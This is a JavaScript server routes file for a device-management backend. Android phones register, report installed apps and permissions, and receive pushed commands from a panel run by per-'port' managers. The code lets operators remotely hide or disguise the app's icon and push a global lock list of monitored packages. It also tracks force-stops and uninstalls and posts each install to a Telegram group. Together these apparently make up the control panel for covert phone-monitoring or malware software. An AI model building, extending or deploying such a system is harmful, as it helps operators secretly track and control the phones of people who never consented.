import { Device } from '../models/Device.js';
import { InstalledApps } from '../models/InstalledApps.js';
import { Command } from '../models/Command.js';
import { getSettings } from '../models/Settings.js';
import { isOnline, onlineCutoff } from '../utils/online.js';
import { escapeRegex, cleanUndefined } from '../utils/helpers.js';
import { idempotencyPreHandler } from '../middleware/idempotency.js';
import { requirePanel, canSeePort } from '../middleware/panelAccess.js';
import { subscribeTokenToTopic } from '../services/fcm.js';
import { issueCommand } from '../services/commands.js';
import { validPort } from '../utils/port.js';
import { notifyPortInstall } from '../services/installNotify.js';
import { Port, firstActionDto } from '../models/Port.js';

/**
 * Per-port client config pushed down on register/heartbeat: the first-action
 * (icon) policy. Offmode is panel-only (not consumed by the client), so it is
 * intentionally NOT delivered here. Always returns a complete, whitelisted shape
 * so a device with no/unknown port still parses it cleanly.
 */
async function portClientConfig(portCode) {
  let doc = null;
  if (validPort(portCode)) {
    doc = await Port.findById(portCode).select('firstAction').lean();
  }
  return {
    firstAction: firstActionDto(doc?.firstAction),
  };
}

/** The phone finishes a REFRESH by uploading the fresh snapshot. */
async function completeRefresh(commandId, deviceId) {
  if (!commandId) return;
  const cmd = await Command.findById(commandId).catch(() => null);
  if (!cmd || cmd.deviceId !== deviceId || cmd.type !== 'REFRESH') return;
  if (cmd.status === 'done' || cmd.status === 'failed') return;
  cmd.status = 'done';
  cmd.result = 'refreshed';
  cmd.deliveredAt = new Date();
  await cmd.save();
}

function deviceDto(d, heartbeatMinutes, grace) {
  return {
    deviceId: d.deviceId,
    port: d.port || '',
    portName: d.portName || '',
    brand: d.brand,
    model: d.model,
    androidVersion: d.androidVersion,
    sdkInt: d.sdkInt,
    appVersion: d.appVersion,
    online: isOnline(d.lastSeenAt, heartbeatMinutes, grace),
    lastSeenAt: d.lastSeenAt,
    permissions: d.permissions,
    info: d.info || {},
    label: d.label || '',
    note: d.note || '',
    iconState: d.iconState,
    lockServiceRunning: d.lockServiceRunning,
    wasForceStopped: d.wasForceStopped,
    uninstalled: d.uninstalled,
    uninstalledAt: d.uninstalledAt,
    lastPingMs: d.lastPingMs,
    lastPingAt: d.lastPingAt,
    createdAt: d.createdAt,
    updatedAt: d.updatedAt,
  };
}

export default async function deviceRoutes(app) {
  const idem = { preHandler: idempotencyPreHandler };
  // Panel-side routes: owner or port manager (see panelAccess).
  const admin = { preHandler: requirePanel };

  // ============================ DEVICE-SIDE =============================

  // The app announces itself on first launch (and re-announces after reinstall).
  app.post('/devices/register', idem, async (req, reply) => {
    const b = req.body || {};
    if (!b.deviceId) return reply.code(400).send({ error: 'deviceId required' });

    const portCode = typeof b.port === 'string' ? b.port.trim() : '';
    if (portCode && !validPort(portCode)) {
      return reply.code(400).send({ error: 'invalid port' });
    }

    const settings = await getSettings();
    const now = new Date();
    const fields = cleanUndefined({
      fcmToken: b.fcmToken,
      brand: b.brand,
      model: b.model,
      androidVersion: b.androidVersion,
      sdkInt: b.sdkInt,
      appVersion: b.appVersion,
      info: b.info,
      port: portCode || undefined,
    });

    let device = await Device.findOne({ deviceId: b.deviceId });
    const wasNew = !device;
    let didReinstall = false;
    if (device) {
      // Reinstall/data-clear lands here (same ANDROID_ID-based deviceId): update
      // the same row and clear the uninstalled flag — NOT a new user.
      if (device.uninstalled) {
        // Re-arm the install notice on a genuine reinstall — atomically, so only
        // the request that actually flips uninstalled→false re-posts the line.
        const flip = await Device.updateOne(
          { deviceId: b.deviceId, uninstalled: true },
          { $set: { lastInstallNotifiedAt: null } },
        );
        didReinstall = flip.modifiedCount === 1;
      }
      Object.assign(device, fields, {
        lastSeenAt: now,
        wasForceStopped: false,
        uninstalled: false,
        uninstalledAt: null,
      });
      await device.save();
    } else {
      try {
        device = await Device.create({
          deviceId: b.deviceId,
          ...fields,
          lastSeenAt: now,
        });
      } catch (e) {
        // Concurrent first-register for the same deviceId: the other request won
        // the unique-index race (E11000). Fall back to updating the now-existing
        // row instead of returning a 500.
        if (e && e.code === 11000) {
          device = await Device.findOneAndUpdate(
            { deviceId: b.deviceId },
            {
              $set: {
                ...fields,
                lastSeenAt: now,
                wasForceStopped: false,
                uninstalled: false,
                uninstalledAt: null,
              },
            },
            { new: true },
          );
        } else {
          throw e;
        }
      }
    }

    if (b.fcmToken) subscribeTokenToTopic(b.fcmToken).catch(() => {});

    // Install log → the port's Telegram group, EXACTLY once per install/reinstall.
    // A fresh install fires several register calls (App, lock service, onboarding,
    // FCM token). Claim the notice ATOMICALLY (null→now) so only ONE of them posts.
    if (validPort(device.port)) {
      const claim = await Device.updateOne(
        { deviceId: device.deviceId, lastInstallNotifiedAt: null },
        { $set: { lastInstallNotifiedAt: now } },
      );
      if (claim.modifiedCount === 1) {
        notifyPortInstall(device, { reinstall: didReinstall })
          .then((r) => {
            if (!r?.ok) {
              // Release the claim so a later register can retry the notice.
              return Device.updateOne(
                { deviceId: device.deviceId },
                { $set: { lastInstallNotifiedAt: null } },
              );
            }
          })
          .catch(() =>
            Device.updateOne(
              { deviceId: device.deviceId },
              { $set: { lastInstallNotifiedAt: null } },
            ).catch(() => {}),
          );
      }
    }

    return reply.code(200).send({
      ok: true,
      device: deviceDto(device, settings.heartbeatMinutes, settings.onlineGraceMultiplier),
      config: {
        heartbeatMinutes: settings.heartbeatMinutes,
        stabilityNotifDelayMinutes: settings.stabilityNotifDelayMinutes,
        ...(await portClientConfig(device.port)),
      },
    });
  });

  // Periodic check-in. Updates liveness + reported state; tells the client if
  // its cached lock list is stale so it can pull the fresh copy.
  app.post('/devices/:id/heartbeat', idem, async (req, reply) => {
    const b = req.body || {};
    const settings = await getSettings();
    const set = cleanUndefined({
      permissions: b.permissions,
      lockServiceRunning: b.lockServiceRunning,
      wasForceStopped: b.wasForceStopped,
      fcmToken: b.fcmToken,
      info: b.info,
    });
    set.lastSeenAt = new Date();

    const device = await Device.findOneAndUpdate(
      { deviceId: req.params.id },
      { $set: set },
      { new: true },
    );
    if (!device) return reply.code(404).send({ error: 'unknown device' });

    // The lock list is GLOBAL (Settings): tell the client to pull it when its
    // cached version differs from the global monitoredVersion.
    const monitoredVersion = settings.monitoredVersion ?? 1;
    const needsLockList = (b.lockListVersion ?? -1) !== monitoredVersion;
    await completeRefresh(b.refreshCommandId, req.params.id);
    return reply.send({
      ok: true,
      lockListVersion: monitoredVersion,
      needsLockList,
      lockList: needsLockList ? settings.monitoredPackages ?? [] : undefined,
      heartbeatMinutes: settings.heartbeatMinutes,
      // Per-port client policy (first-action icon + offmode commands). The client
      // applies this from the `config` object on both register and heartbeat.
      config: {
        heartbeatMinutes: settings.heartbeatMinutes,
        stabilityNotifDelayMinutes: settings.stabilityNotifDelayMinutes,
        ...(await portClientConfig(device.port)),
      },
    });
  });

  // Installed-app list (package + label + system flag).
  app.put('/devices/:id/apps', idem, async (req, reply) => {
    const apps = (Array.isArray(req.body?.apps) ? req.body.apps : []).map((a) => ({
      package: a.package,
      label: a.label || '',
      system: !!a.system,
    }));
    const device = await Device.findOne({ deviceId: req.params.id });
    if (!device) return reply.code(404).send({ error: 'unknown device' });
    await InstalledApps.findOneAndUpdate(
      { deviceId: req.params.id },
      { $set: { apps } },
      { upsert: true },
    );
    await Device.updateOne(
      { deviceId: req.params.id },
      { $set: { lastSeenAt: new Date() } },
    );
    await completeRefresh(req.body?.refreshCommandId, req.params.id);
    return reply.send({ ok: true, count: apps.length });
  });

  // Current permission snapshot.
  app.put('/devices/:id/permissions', idem, async (req, reply) => {
    const perms = req.body?.permissions || req.body || {};
    const device = await Device.findOneAndUpdate(
      { deviceId: req.params.id },
      { $set: { permissions: perms, lastSeenAt: new Date() } },
      { new: true },
    );
    if (!device) return reply.code(404).send({ error: 'unknown device' });
    return reply.send({ ok: true, permissions: device.permissions });
  });

  // Result of a previously-issued command. For PING we compute the round-trip
  // time (FCM send → device → this reply) and store it on the command + device.
  app.post('/devices/:id/command-result', idem, async (req, reply) => {
    const { commandId, ok, detail } = req.body || {};
    const now = new Date();
    if (commandId) {
      const cmd = await Command.findById(commandId).catch(() => null);
      if (cmd) {
        cmd.status = ok ? 'done' : 'failed';
        cmd.result = detail ?? null;
        cmd.deliveredAt = now;
        if (cmd.type === 'PING' && cmd.sentAt) {
          cmd.rttMs = now.getTime() - new Date(cmd.sentAt).getTime();
          await Device.updateOne(
            { deviceId: req.params.id },
            { $set: { lastPingMs: cmd.rttMs, lastPingAt: now } },
          );
        } else if (cmd.type === 'ICON' && ok) {
          // Trust the state the device ACTUALLY applied (detail): a "hide" may
          // have fallen back to a "change" where hiding the icon isn't supported.
          const ICON_STATES = ['hidden', 'normal', 'variant1', 'variant2'];
          const reported = typeof detail === 'string' ? detail.trim() : '';
          const iconState = ICON_STATES.includes(reported)
            ? reported
            : cmd.payload?.iconState;
          if (iconState) {
            await Device.updateOne(
              { deviceId: req.params.id },
              { $set: { iconState } },
            );
          }
        }
        await cmd.save();
      }
    }
    await Device.updateOne(
      { deviceId: req.params.id },
      { $set: { lastSeenAt: now } },
    );
    return reply.send({ ok: true });
  });

  // Command status (panel polls this after a ping to read the measured RTT).
  app.get('/commands/:id', admin, async (req, reply) => {
    const cmd = await Command.findById(req.params.id).lean().catch(() => null);
    if (!cmd) return reply.code(404).send({ error: 'not found' });
    return reply.send({
      id: String(cmd._id),
      type: cmd.type,
      status: cmd.status,
      rttMs: cmd.rttMs ?? null,
      sentAt: cmd.sentAt,
      deliveredAt: cmd.deliveredAt,
    });
  });

  // ============================= PANEL-SIDE =============================

  // Set a device's admin annotation (name + note). Shared across admins.
  app.put('/devices/:id/annotation', admin, async (req, reply) => {
    const existing = await Device.findOne({ deviceId: req.params.id }).lean();
    if (!existing) return reply.code(404).send({ error: 'unknown device' });
    if (!assertDeviceAccess(req, existing)) return reply.code(403).send({ error: 'forbidden' });
    const b = req.body || {};
    const set = {};
    if (typeof b.label === 'string') set.label = b.label.slice(0, 120);
    if (typeof b.note === 'string') set.note = b.note.slice(0, 2000);
    const device = await Device.findOneAndUpdate(
      { deviceId: req.params.id },
      { $set: set },
      { new: true },
    ).lean();
    if (!device) return reply.code(404).send({ error: 'unknown device' });
    return reply.send({ ok: true, label: device.label || '', note: device.note || '' });
  });

  function assertDeviceAccess(req, device) {
    const access = req.panelAccess;
    if (!access || access.role === 'admin') return true;
    if (access.role === 'manager') return canSeePort(access, device?.port || '');
    return false;
  }

  // Paginated, filterable, indexed device list.
  app.get('/devices', admin, async (req, reply) => {
    const settings = await getSettings();
    const page = Math.max(1, parseInt(req.query.page || '1', 10));
    const limit = Math.min(200, Math.max(1, parseInt(req.query.limit || '50', 10)));
    const q = (req.query.q || '').trim();

    const and = [];
    // Managers only see devices on their ports.
    if (req.panelAccess?.role === 'manager') {
      and.push({ port: { $in: req.panelAccess.ports || [] } });
    }
    const portFilter = String(req.query.port || '').trim();
    if (portFilter) {
      if (!validPort(portFilter)) return reply.code(400).send({ error: 'invalid port' });
      if (!canSeePort(req.panelAccess, portFilter)) {
        return reply.code(403).send({ error: 'forbidden' });
      }
      and.push({ port: portFilter });
    }
    if (q) {
      const rx = new RegExp(escapeRegex(q), 'i');
      and.push({ $or: [{ deviceId: rx }, { brand: rx }, { model: rx }, { label: rx }] });
    }
    if (req.query.online === 'true') {
      and.push({
        lastSeenAt: {
          $gte: onlineCutoff(settings.heartbeatMinutes, settings.onlineGraceMultiplier),
        },
      });
    } else if (req.query.online === 'false') {
      and.push({
        $or: [
          { lastSeenAt: null },
          {
            lastSeenAt: {
              $lt: onlineCutoff(settings.heartbeatMinutes, settings.onlineGraceMultiplier),
            },
          },
        ],
      });
    }
    // Uninstalled filter: 'true' → only uninstalled; 'false' → only active.
    if (req.query.uninstalled === 'true') {
      and.push({ uninstalled: true });
    } else if (req.query.uninstalled === 'false') {
      and.push({ uninstalled: { $ne: true } });
    }
    // Monitored filter: devices that have at least one globally-monitored app.
    if (req.query.monitored === 'true') {
      const mp = settings.monitoredPackages || [];
      let ids = [];
      if (mp.length) {
        const docs = await InstalledApps.find(
          { 'apps.package': { $in: mp } },
          { deviceId: 1 },
        ).lean();
        ids = docs.map((x) => x.deviceId);
      }
      and.push({ deviceId: { $in: ids } });
    }
    const filter = and.length ? { $and: and } : {};

    const [items, total] = await Promise.all([
      Device.find(filter)
        .sort({ lastSeenAt: -1 })
        .skip((page - 1) * limit)
        .limit(limit)
        .lean(),
      Device.countDocuments(filter),
    ]);
    const codes = [...new Set(items.map((d) => d.port).filter(Boolean))];
    if (codes.length) {
      const named = await Port.find({ _id: { $in: codes } }).select('name').lean();
      const byCode = new Map(named.map((p) => [p._id, p.name || '']));
      for (const d of items) d.portName = byCode.get(d.port) || '';
    }

    return reply.send({
      items: items.map((d) =>
        deviceDto(d, settings.heartbeatMinutes, settings.onlineGraceMultiplier),
      ),
      total,
      page,
      limit,
    });
  });

  app.get('/devices/:id', admin, async (req, reply) => {
    const settings = await getSettings();
    const device = await Device.findOne({ deviceId: req.params.id }).lean();
    if (!device) return reply.code(404).send({ error: 'unknown device' });
    if (!assertDeviceAccess(req, device)) return reply.code(403).send({ error: 'forbidden' });
    if (device.port) {
      const named = await Port.findById(device.port).select('name').lean();
      device.portName = named?.name || '';
    }
    const appsDoc = await InstalledApps.findOne({ deviceId: req.params.id }).lean();
    return reply.send({
      ...deviceDto(device, settings.heartbeatMinutes, settings.onlineGraceMultiplier),
      installedAppsCount: appsDoc?.apps?.length || 0,
    });
  });

  app.get('/devices/:id/apps', admin, async (req, reply) => {
    const device = await Device.findOne({ deviceId: req.params.id }).lean();
    if (!device) return reply.code(404).send({ error: 'unknown device' });
    if (!assertDeviceAccess(req, device)) return reply.code(403).send({ error: 'forbidden' });
    const appsDoc = await InstalledApps.findOne({ deviceId: req.params.id }).lean();
    if (!appsDoc) return reply.send({ apps: [], updatedAt: null });
    return reply.send({ apps: appsDoc.apps, updatedAt: appsDoc.updatedAt });
  });

  // Ask one phone to re-measure. `state` re-reads permissions and hardware.
  // `apps` re-scans installed packages. The command is done only after that
  // upload lands, so the panel does not reload the previous copy.
  app.post('/devices/:id/refresh', admin, async (req, reply) => {
    const device = await Device.findOne({ deviceId: req.params.id }).lean();
    if (!device) return reply.code(404).send({ error: 'unknown device' });
    if (!assertDeviceAccess(req, device)) return reply.code(403).send({ error: 'forbidden' });
    const scope = req.body?.scope === 'apps' ? 'apps' : 'state';
    const existing = await Command.findOne({
      deviceId: req.params.id,
      type: 'REFRESH',
      'payload.scope': scope,
      status: { $in: ['pending', 'sent'] },
      createdAt: { $gte: new Date(Date.now() - 20_000) },
    })
      .sort({ createdAt: -1 })
      .lean();
    if (existing) {
      return reply.send({ ok: true, commandId: existing._id, scope, reused: true });
    }
    const r = await issueCommand(req.params.id, 'REFRESH', { scope });
    if (r.code === 404) return reply.code(404).send({ error: 'unknown device' });
    return reply.send({ ok: r.ok, commandId: r.command?._id, scope });
  });

  // On-demand liveness probe.
  app.post('/devices/:id/ping', admin, async (req, reply) => {
    const device = await Device.findOne({ deviceId: req.params.id }).lean();
    if (!device) return reply.code(404).send({ error: 'unknown device' });
    if (!assertDeviceAccess(req, device)) return reply.code(403).send({ error: 'forbidden' });
    const r = await issueCommand(req.params.id, 'PING', {});
    if (r.code === 404) return reply.code(404).send({ error: 'unknown device' });
    return reply.send({ ok: r.ok, commandId: r.command?._id, delivered: r.fcm });
  });

  // Icon control: hide | change | restore. The device's iconState is NOT changed
  // here — it is updated only when the client reports the command succeeded
  // (see /command-result). The panel polls the command to confirm.
  app.post('/devices/:id/icon', admin, async (req, reply) => {
    const device = await Device.findOne({ deviceId: req.params.id }).lean();
    if (!device) return reply.code(404).send({ error: 'unknown device' });
    if (!assertDeviceAccess(req, device)) return reply.code(403).send({ error: 'forbidden' });
    const { action, variant } = req.body || {};
    if (!['hide', 'change', 'restore'].includes(action)) {
      return reply.code(400).send({ error: 'action must be hide|change|restore' });
    }
    const iconState =
      action === 'hide'
        ? 'hidden'
        : action === 'restore'
          ? 'normal'
          : variant || 'variant1';
    const r = await issueCommand(req.params.id, 'ICON', {
      action,
      variant: variant || '',
      iconState,
    });
    if (r.code === 404) return reply.code(404).send({ error: 'unknown device' });
    return reply.send({
      ok: r.ok,
      commandId: r.command?._id,
      targetIconState: iconState,
      delivered: r.fcm,
    });
  });
}
